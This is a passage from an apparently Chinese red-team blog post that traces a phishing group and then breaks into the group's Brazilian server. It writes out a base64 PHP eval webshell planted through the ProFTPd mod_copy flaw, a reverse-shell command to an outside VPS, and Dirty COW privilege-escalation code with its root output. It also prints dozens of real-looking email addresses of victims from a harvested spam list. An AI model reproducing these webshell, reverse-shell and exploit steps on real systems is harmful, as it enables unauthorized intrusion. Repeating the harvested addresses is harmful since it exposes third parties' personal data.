198.143.32.13 131 198.143.32.3 103 198.143.57.3 86 198.143.57.73 84 198.143.57.5 46 198.143.32.10 32 198.143.37.15 ...... ⚡ root@kali  /tmp  for line in $(\u0026lt;/ip.txt); do curl https://ip.cn/\\?ip\\=$line ; done IP: 198.143.51.17 来自: 以色列 Incapsula IP: 198.143.38.3 来自: 美国 Incapsula IP: 198.143.41.14 来自: 美国 Incapsula IP: 198.143.32.13 来自: 美国 Incapsula IP: 198.143.32.3 来自: 美国 Incapsula IP: 198.143.57.3 来自: 美国 Incapsula IP: 198.143.57.73 来自: 美国 Incapsula IP: 198.143.57.5 来自: 美国 Incapsula IP: 198.143.32.10 来自: 美国 Incapsula ......   这个网站由于日志不全，提取出的IP大都是爬虫IP，所以不纳入最终的汇总。\n  4.5.3 发现钓鱼程序 网站　zebramedia.al　上发现多个攻击者放置的钓鱼程序和模板。\n针对Dropbox\n针对Gmail\n 4.6 关联分析 使用之前得到的后门文件中的关键字（config.php）对这3个网站文件进行匹配，发现其中2个存在相同后门文件，并且文件MD5值相同。\n ⚡ root@kali  /tmp  find . -name \u0026quot;*.php\u0026quot; |xargs grep \u0026quot;\\$bm_____s\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $1}' ./rosturplast.com/www/rosturplast.com/shells/config.php ./mirohaviar.sk/www/config.php ./zebramedia.al/www/zebramedia.al/config.php ./www.radiolanalhue.cl/www/public_html/online/administrator/templates/bluestork/config.php  后门文件MD5\n ⚡ root@kali  /tmp  find . -name \u0026quot;*.php\u0026quot; |xargs grep \u0026quot;\\$bm_____s\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $1}' |xargs md5sum e5c06f1f66781ba5c39d909096c4cd47 ./rosturplast.com/www/rosturplast.com/shells/config.php e5c06f1f66781ba5c39d909096c4cd47 ./mirohaviar.sk/www/config.php e5c06f1f66781ba5c39d909096c4cd47 ./zebramedia.al/www/zebramedia.al/config.php e5c06f1f66781ba5c39d909096c4cd47 ./www.radiolanalhue.cl/www/public_html/online/administrator/templates/bluestork/config.php   五、渗透攻击者傀儡服务器 5.1 漏洞扫描 目标：187.85.134.4\n [+] HOST: 187.85.134.4（巴西）\n[+] OS: Ubuntu [+] Web Server: Apache/2.2.22 / PHP/5.3.10-1ubuntu3.19\n[+] CMS: 未知\n nmap --script=firewalk --traceroute 187.85.134.4  5.２ 漏洞利用 端口扫描发现目标 FTP Server为ProFTPd 1.3.4a，这个版本和1.3.5存在未授权文件复制漏洞，我们可以通过这个漏洞往Web目录写入一个WebShell。\nProFTPd 1.3.5 Remote Command Execution（CVE-2015-3306） ProFTPD中使用的mod_copy模块存在未授权访问风险，导致ProFTPD自带的命令 SITE CPFR 和 SITE CPTO可在未登录ftp的情况被外部黑客所利用，对系统文件进行任意复制。  5.２ 获取权限 使用用MSF执行\n得到一个cmd功能的WebShell\n写入中国菜刀客户端\nhttp://187.85.134.4/lndex.php?img=echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+Cg== |base64 -d \u0026gt;/var/www/index2.php  5.3 文件分析 在Web目录下面发现用于发送钓鱼邮件的perl脚本、邮件钓鱼样本和大量的邮箱地址。以及挖矿后门、DDOS脚本等。\n5.3.1 钓鱼模板 图示是针对丹麦丹斯克银行（Danske Bank）和希腊阿尔法银行（Alpha Bank）的邮件钓鱼样本。\n5.3.2 僵尸网络程序 5.3.3 DDOS脚本 5.3.4 邮箱地址  统计目录下的 txt 文本数量，发现共有六十二万四千个邮箱地址。\n  ⚡ root@kali  /tmp/187.85.134.4/www/cat  wc -l *.txt 624000 总用量  主流邮箱检索\n ⚡ root@kali  /tmp/187.85.134.4/www/cacat  grep \u0026quot;@gmail.com\u0026quot; *.txt |head -n 20 a0000001.txt:a.l.v.e.rtadsmileyksso@gmail.com a0000001.txt:a.l.v.ertadsmileyksso@gmail.com a0000001.txt:a.lfer.gm@gmail.com a0000001.txt:a.lieseijsink@gmail.com a0000001.txt:a.linkhusen@gmail.com a0000001.txt:a.loldrup@gmail.com a0000001.txt:a.lovendahl@gmail.com a0000001.txt:a.lv.e.rtadsmileyksso@gmail.com a0000001.txt:a.lver.tadsmileyksso@gmail.com a0000001.txt:a.m.edsberg@gmail.com a0000001.txt:a.m.morcke@gmail.com a0000001.txt:a.m.quist@gmail.com a0000001.txt:a.m.svendsen@gmail.com a0000001.txt:a.merete.p@gmail.com a0000001.txt:a.mette.sm@gmail.com a0000001.txt:a.miller8111@gmail.com a0000001.txt:a.moejbaek@gmail.com a0000001.txt:a.moltkehansen@gmail.com a0000001.txt:a.munktved@gmail.com a0000001.txt:a.n.knutzen@gmail.com ⚡ root@kali  /tmp/187.85.134.4/www/cat  grep \u0026quot;@outlook.com\u0026quot; *.txt |head -n 20 a0000001.txt:a.m.westra@outlook.com a0000001.txt:a.olsen@outlook.com a0000002.txt:aagren@outlook.com a0000003.txt:aandanimalcity@outlook.com a0000003.txt:aarhus-ungegruppe@outlook.com a0000004.txt:aase.lousdal@outlook.com a0000006.txt:abroschultz@outlook.com a0000008.txt:adamfred2@outlook.com a0000008.txt:adexecsolution@outlook.com a0000010.txt:adrian.f.a.svendsen@outlook.com a0000015.txt:aiah@outlook.com a0000015.txt:aimeegarcia584@outlook.com a0000016.txt:ajolicoeu@outlook.com a0000018.txt:akstrup@outlook.com a0000020.txt:alexander_bangsborg@outlook.com a0000020.txt:alexanderkopke@outlook.com a0000020.txt:ali__sivan@outlook.com a0000021.txt:alicegerner@outlook.com a0000022.txt:allanjeppesen@outlook.com a0000023.txt:allworlduseu@outlook.com ⚡ root@kali  /tmp/187.85.134.4/www/cat  grep \u0026quot;@163.com\u0026quot; *.txt |head -n 20 a0000001.txt:a31a18615@163.com a0000001.txt:a398c671@163.com a0000059.txt:backlink0321@163.com a0000061.txt:banqianm8256@163.com a0000075.txt:bf86ad32@163.com a0000121.txt:cbb146672@163.com a0000129.txt:chenbin800519@163.com a0000134.txt:chuofuh3082@163.com a0000157.txt:davidhuang001@163.com a0000162.txt:dfjiuew@163.com a0000209.txt:f08dbf326@163.com a0000213.txt:fanxued79193@163.com a0000221.txt:fjfzpy@163.com a0000227.txt:fon@163.com a0000259.txt:guangdk@163.com a0000311.txt:huhuanqiang00161@163.com  5.4 提权 5.4.1 CVE-2013-2094，CVE-2013-1763提权 查看apache日志目录，发现没有权限。\n[/var/www/]$ls -al /var/log/apache2/ ls: cannot open directory /var/log/apache2/: Permission denied  内核版本为3.5.0-23，尝试提权。\n[/var/www/]$cat /etc/issue Ubuntu 12.04.2 LTS \\n \\l [/var/www/]$uname -an Linux medidor2 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013 GNU/Linux  WebShell反弹： [/var/www/]$cd /var/tmp;./pty xxx.xxx.xxx.xxx 443 外网VPS监听： socat file:`tty`,echo=0,raw tcp-listen:443  实际测试CVE-2013-2094，CVE-2013-1763均无法提权。\nCVE-2013-2094 Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3) CVE-2013-1763 Linux Kernel \u0026lt; 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation  5.4.2 脏牛提权 祭出大杀器CVE-2016-5195（脏牛） ， 理论上通杀 2.6.22 \u0026lt; 3.9 (x86/x64)的内核版本。\n 在本地环境提权测试过程中发现，i386架构下使用cowroot提权时EXP会破坏源文件，导致提权失败。而使用dirtycow-mem仅修改内存则没有问题，但是存在内核崩溃的风险。这两个EXP都是利用/proc/self/mem提权，前一个修改文件，后一个修改内存。\n 如图所示：\n使用dirtycow-mem.c提权时需要注意：i386架构下编译前需要将源代码中libc路径修改为目标系统libc路径，否则执行时找不到文件。\n#define SHELLCODE\t\u0026quot;\\x31\\xc0\\xc3\u0026quot; #define SPACE_SIZE\t256 #define LIBC_PATH\t\u0026quot;/lib/x86_64-linux-gnu/libc.so.6\u0026quot; ## 改为　/lib/i386-linux-gnu/libc.so.6 #define LOOP\t0x1000000 #ifndef PAGE_SIZE #define PAGE_SIZE 4096  Give me root :），提权成功。\nwww-data@medidor2:/tmp$gcc -Wall -o hello dirtycow-mem.c -ldl -lpthread www-data@medidor2:/tmp$ ls hello www-data@medidor2:/tmp$ chmod +x hello www-data@medidor2:/tmp$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@medidor2:/tmp$ ./hello [*] range: b7573000-b7716000] [*] getuid = b762bd10 [*] mmap 0xb73cb000 [*] exploiting (patch) [*] patched (madviseThread) [*] patched (procselfmemThread) root@medidor2:/tmp# [*] exploiting (unpatch) [*] unpatched: uid=33 (madviseThread) [*] unpatched: uid=33 (procselfmemThread) root@medidor2:/tmp# id uid=0(root) gid=0(root) groups=0(root)  打包Apache日志。\n✘ ⚡ root@kali  ls /var/log/apache2 access error other_vhosts_access.log ✘ ⚡ root@kali  tar zcvf /var/www/apache2-log.tar.gz /var/log/apache2/ ✘ ⚡ root@kali  /tmp  ltor wget http://187.85.134.4/apache2-log.tar.gz [proxychains] config file found: /data/app/local/proxychains_local_tor/proxychains.conf [proxychains] preloading /data/app/local/proxychains_local_tor/libproxychains4.so [proxychains] DLL init --2011-11-11 11:11:11-- http://187.85.134.4/apache2-log.tar.gz 正在连接 187.85.134.4:80... [proxychains] Strict chain ... 127.0.0.1:9050 ... 187.85.134.4:80 ... OK 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：9258688 (8.8M) [application/x-gzip] 正在保存至: “apache2-log.tar.gz” apache2-log.tar.gz 100%[===================\u0026gt;] 8.83M 29.6KB/s 用时 5m 45s 2018-11-11 11:11:11 (26.2 KB/s) - 已保存 “apache2-log.tar.gz” [9258688/9258688])  5.5 分析日志 分析IP访问情况\n⚡ root@kali  /tmp/  grep \u0026quot;/cacat/\u0026quot; * |grep \u0026quot;php\u0026quot; | awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort -t \u0026quot; \u0026quot; -k 1 -n -r \u0026gt;ip.txt 95 185.56.80.138 77 197.211.60.52 70 67.71.3.8 59 207.35.210.35 41 99.226.207.46 41 193.215.40.238 39 197.211.59.163 38 82.61.95.132 38 66.249.73.95 37 76.26.34.181 37 197.234.221.77 31 105.112.27.60 29 105.112.23.41 20 109.166.138.68 16 66.249.79.61 16 197.211.61.18 14 212.100.77.191 12 197.234.221.210 8 66.249.79.35 8 66.249.73.64 7 154.118.69.165 5 66.249.73.67 ...... ⚡ root@kali  /tmp  for line in $(\u0026lt;ip.txt); do curl https://ip.cn/\\?ip\\=$line ; done IP: 185.56.80.138 来自: 荷兰 IP: 197.211.60.52 来自: 尼日利亚 IP: 67.71.3.8 来自: 加拿大 IP: 207.35.210.35 来自: 加拿大 IP: 99.226.207.46 来自: 加拿大 IP: 193.215.40.238 来自: 挪威 IP: 197.211.59.163 来自: 尼日利亚 IP: 82.61.95.132 来自: 意大利 IP: 66.249.73.95 来自: Google 骨干网 IP: 76.26.34.181 来自: 美国 IP: 197.234.221.77 来自: 贝宁 IP: 105.112.27.60 来自: 尼日利亚 IP: 105.112.23.41 来自: 尼日利亚 IP: 109.166.138.68 来自: 罗马尼亚 IP: 66.249.79.61 来自: Google 骨干网 IP: 197.211.61.18 来自: 尼日利亚 IP: 212.100.77.191 来自: 尼日利亚 IP: 197.234.221.210 来自: 贝宁 IP: 66.249.79.35 来自: Google 骨干网 IP: 66.249.73.64 来自: Google 骨干网 IP: 154.118.69.165 来自: 尼日利亚 IP: 66.249.73.67 来自: Google 骨干网 ......  根据路径名判断，疑似受害者访问了钓鱼页面。\n ⚡ root@kali  /tmp/ grep \u0026quot;/cacat\u0026quot; *| grep \u0026quot;php\u0026quot; |grep \u0026quot;POST\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $2 $6}' |sort |uniq 109.166.138.68 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\u0026quot; 109.166.138.68 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php?sfm_sid=120\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\u0026quot; 185.56.80.138 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php?sfm_sid=8425\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\u0026quot; 196.52.34.20 - - [12/Oct/201835.0) Gecko/20100101 Firefox/35.0\u0026quot; 207.35.210.35 - - [21/Aug/2018//187.85.134.4/cacat/win2018/winbnk/EBlogin.html?sitecode=GR\u0026amp;lang=el-GR\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\u0026quot; 197.211.60.52 - - [07/Sep/2018:16:02:40 -0300] \u0026quot;GET /cacat/nnnnn.zip HTTP/1.1\u0026quot; 200 4489167 \u0026quot;http://187.85.134.4/cacat/\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36\u0026quot;  查看web目录下txt文件访问情况，总共有一万多IP。访问地址包含受害者主机IP、各种搜索引擎爬虫IP、各路黑客的IP等等。\ngrep \u0026quot;/cacat/\u0026quot; * |grep \u0026quot;txt\u0026quot; | awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort -t \u0026quot; \u0026quot; -k 1 -n -r \u0026gt;ip.txt ⚡ root@kali  ~/Desktop  wc -l ip.txt 10101 ip.txt  5.6 访问IP热力图 5.6.1 IP转经纬度坐标 将获得的IP转换成经纬度坐标，再通过百度地图API生成热力图\n 将IP转换成经纬度坐标，脚本：ip2xy.py 生成经纬度坐标文件：point.js 全球IP库：GeoLiteCity.dat\n #!/usr/bin/python #coding:utf-8 import pandas as pd import pygeoip import types import sys gi = pygeoip.GeoIP('/tmp/GeoLiteCity.dat', pygeoip.MEMORY_CACHE) def getLocal(ip): if type(ip) != types.StringType: print ip return location = gi.record_by_addr(ip) if location is None: print ip return lng = location['longitude'] lat = location['latitude'] str_temp = '{\u0026quot;lat\u0026quot;:' + str(lat) + ',\u0026quot;lng\u0026quot;:' + str(lng) + '},\\n' print ip,lng,lat,str_temp file.write(str_temp) file = open('/tmp/point.js', 'w') file.write(\u0026quot;var points =[\\n\u0026quot;) with open(\u0026quot;/tmp/ip.txt\u0026quot;) as f: i = 0 for ip in f.readlines(): getLocal(ip) file.write(\u0026quot;];\\n\u0026quot;) file.close()  5.6.2 调用百度地图API 本地调用百度地图 JavaScript API： map.html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026quot;Content-Type\u0026quot; content=\u0026quot;text/html; charset=utf-8\u0026quot; /\u0026gt; \u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;initial-scale=1.0, user-scalable=no\u0026quot; /\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;http://api.map.baidu.com/api?v=2.0\u0026amp;ak=填写自己的百度AK\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;http://api.map.baidu.com/library/Heatmap/2.0/src/Heatmap_min.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;./point.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;title\u0026gt;热力图功能示例\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt; ul,li{list-style: none;margin:0;padding:0;float:left;} html{height:100%} body{height:100%;margin:0px;padding:0px;font-family:\u0026quot;微软雅黑\u0026quot;;} #container{height:100%;width:100%;} #r-result{width:100%;} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026quot;container\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;r-result\u0026quot; style=\u0026quot;display:none\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; onclick=\u0026quot;openHeatmap();\u0026quot; value=\u0026quot;显示热力图\u0026quot;/\u0026gt;\u0026lt;input type=\u0026quot;button\u0026quot; onclick=\u0026quot;closeHeatmap();\u0026quot; value=\u0026quot;关闭热力图\u0026quot;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt; var map = new BMap.Map(\u0026quot;container\u0026quot;); // 创建地图实例 var point = new BMap.Point(34.0224714118,109.0786868715); map.centerAndZoom(point, 6); // 初始化地图，设置中心点坐标和地图级别 map.setCurrentCity(\u0026quot;西安\u0026quot;);\t//设置当前显示城市 map.enableScrollWheelZoom(); // 允许滚轮缩放 if(!isSupportCanvas()){ alert('热力图目前只支持有canvas支持的浏览器,您所使用的浏览器不能使用热力图功能~') } //详细的参数,可以查看heatmap.js的文档 https://github.com/pa7/heatmap.js/blob/master/README.md //参数说明如下: /* visible 热力图是否显示,默认为true * opacity 热力的透明度,1-100 * radius 势力图的每个点的半径大小 * gradient {JSON} 热力图的渐变区间 . gradient如下所示 * { .2:'rgb(0, 255, 255)', .5:'rgb(0, 110, 255)', .8:'rgb(100, 0, 255)' } 其中 key 表示插值的位置, 0~1. value 为颜色值. */ heatmapOverlay = new BMapLib.HeatmapOverlay({\u0026quot;radius\u0026quot;:100,\u0026quot;visible\u0026quot;:true}); map.addOverlay(heatmapOverlay); heatmapOverlay.setDataSet({data:points,max:100}); //closeHeatmap(); //判断浏览区是否支持canvas function isSupportCanvas(){ var elem = document.createElement('canvas'); return !!(elem.getContext \u0026amp;\u0026amp; elem.getContext('2d')); } function setGradient(){ /*格式如下所示: { 0:'rgb(102, 255, 0)', .5:'rgb(255, 170, 0)', 1:'rgb(255, 0, 0)' }*/ var gradient = {}; var colors = document.querySelectorAll(\u0026quot;input[type='color']\u0026quot;); colors = [].slice.call(colors,0); colors.forEach(function(ele){ gradient[ele.getAttribute(\u0026quot;data-key\u0026quot;)] = ele.value; }); heatmapOverlay.setOptions({\u0026quot;gradient\u0026quot;:gradient}); } function openHeatmap(){ heatmapOverlay.show(); } function closeHeatmap(){ heatmapOverlay.hide(); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  5.6.3 生成热力图 如图所示，欧洲IP居多，亚洲也不少。至于有多少主机沦陷和多少受害者上钩，无法准确判断。\n   六、信息汇总 根据所得信息汇总，对这个黑客组织信息进行简单分析，仅供参考。\n6.1 组织信息  名称：\n Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber\n 地区：\n 巴勒斯坦\n 成员ID：\n Hawk_B404 、 MR.S1NS_Y 、 koneksi eror 、 GU3LT03M 、 SinonX 、 ./B4Z1R007 、 ./Bl4ckJ4ck 、 anon99husein 、 4GottenName 、Gantai 、 4nzeL4 、 AKEMI403\n 历史邮箱：\n alexsin54@yahoo.com jasonchowan223@gmail.com macacperus@yopmail.com bidibidibidi@yopmail.com bidi.pici11@hotmail.com bidi.cuc@mail.com flrnvasilica@gmail.com\n 组织主页：\n http://mujahidincyberarmy.blogspot.com/ https://www.facebook.com/FamilyAttackCyberOfficial/\n  6.2 攻击手段   入侵使用Wordpress、Joomla! CMS的网站、放置钓鱼程序，批量传播钓鱼邮件。\n 攻击目标：\n 早期政治目的居多，主要攻击美国政府机构网站和雇员。近期多为商业目的，主要针对欧洲银行客户以及亚洲金融机构雇员进行邮件钓鱼。\n 控制主机：\n 187.85.134.4\n 常用后门：\n 略\n  6.3 攻击历史  美国联邦调查局、美国国土安全部、美国司法部\n 巴勒斯坦黑客已经发布了大约2万名联邦调查局（FBI）和9,000名国土安全部（DHS）官员的个人信息 http://mujahidincyberarmy.blogspot.com/2016/12/inilah-data-informasi-pribadi-20-ribu.html\n  通过钓鱼邮件获得美国司法部权限 http://mujahidincyberarmy.blogspot.com/2016/02/hacker-pro-palestina-terbitkan.html\n  6.4 代理IP 174.85.145.99 (美国) - - [27/Nov/2018:23:35:31 +0300] \u0026quot;POST /shells/bacu.php HTTP/1.1\u0026quot; 200 4731 \u0026quot;http://www.rosturplast.com/shells/bacu.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 50.73.252.169 (美国) - - [29/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 213.233.104.120 (罗马尼亚) - - [27/Nov/2018:22:10:03 +0300] \u0026quot;GET /shells/config.php HTTP/1.1\u0026quot; 200 124 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\u0026quot; 207.228.149.69 (百慕大 ) - - [28/Nov/2018:23:12:54 +0300] \u0026quot;POST /shells/config.php HTTP/1.1\u0026quot; 200 3729 \u0026quot;http://www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 195.211.23.207 (俄罗斯) - - [27/Nov/2018:22:36:50 +0300] \u0026quot;GET /shells/config.php HTTP/1.1\u0026quot; 200 124 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\u0026quot; 29.205.113.8 (尼日利亚) - - [30/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36\u0026quot; 212.1.211.3 （美国） - - [30/Nov/2018:13:35:36 -0300] \u0026quot;GET /online/templates/beez5/bc.php HTTP/1.1\u0026quot; 200 16823 \u0026quot;-\u0026quot; \u0026quot;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\u0026quot; 178.128.221.199 （希腊）- - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\u0026quot; 197.211.61.82 （尼日利亚) - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot;  6.5 被黑网站 不完全统计 rosturplast.com mirohaviar.sk helioncomposites.com radiolanalhue.cl zebramedia.al www.qtfontebispo.com www.seoeaze.com vilapoucadeaguiar.com proyectosphr.cl u-p.com www.humanaconsultores.cl amsogroup.com www.tdftechnologies.com www.bvvagos.pt www.huellasdigitales.cl lince.apsl.edu.pl www.fica.unsl.edu.ar proyectosphr.cl www.zlobek.uw.edu.pl ifr.pt mail.ijrer.org www.hkmms.org.hk historia.apsl.edu.pl www.homeguide.com.sg onlinecombos.co.in umo.apsl.edu.pl www.bpmp2t.lombokbaratkab.go.id amsogroup.com viper.cl www.teniscavancha.cl www.estacaomedica.pt terrarestobar.cl jf-bragado.pt helioncomposites.com notariabasualto.cl ericdiblasi.com reinamarltda.cl cobraz.pt www.stmarypellaia.com webcam.wm-itservice.at   七、攻击路径还原 复盘整个溯源过程，还原攻击者攻击路径。\n","date":"2019-11-02","permalink":"https://xeye.io/post/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/","tags":["红队"],"title":"如何通过一封恶意邮件追踪幕后黑客组织"}]